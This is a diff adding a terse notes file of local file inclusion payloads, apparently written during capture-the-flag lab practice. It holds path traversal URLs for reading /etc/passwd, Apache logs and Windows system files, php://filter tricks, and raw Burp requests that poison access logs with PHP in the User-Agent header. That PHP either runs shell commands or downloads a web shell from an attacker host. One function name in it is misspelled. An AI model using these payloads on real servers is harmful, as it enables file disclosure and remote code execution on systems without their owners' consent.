@@ -1,0 +1,38 @@
+http://prueba.com/vuln.php?file=../../../../../../../../etc/passwd
+http://ex.com/index.php?page=../../../etc/passwd%00
+http://10.10.66.72/?view=php://filter/convert.base64-encode/resource=cat/../index
+http://10.10.66.72/?view=php://filter/convert.base64-encode/resource=dog/../../../../../var/log/apache2/access.log&ext
+http://10.10.205.6/?view=../../../../etc/cat/../passwd&ext
+http://10.10.205.6/?view=../../../../var/log/apache2/cat/../access.log&ext
+
+------
+User-Agent: <?php file_puts_contents('shell.php', file_get_contents('http://10.14.15.207/shell.php'));?>
+
+------
+burp:
+GET /?view=../../../../var/log/apache2/cat/../access.log&ext&shell="ls" HTTP/1.1
+Host: 10.10.217.131
+User-Agent: <?php system($_GET['shell']);?>
+Content-Length: 200
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+--------
+windows:
+http://webapp.thm/get.php?file=../../../../boot.ini
+http://webapp.thm/get.php?file=../../../../windows/win.ini
+
+
+GET /?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
+Host: 10.10.59.238
+User-Agent: <?php file_put_contents('f3v3r.php',file_get_contents('http://10.X.X.X/shell.php')); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
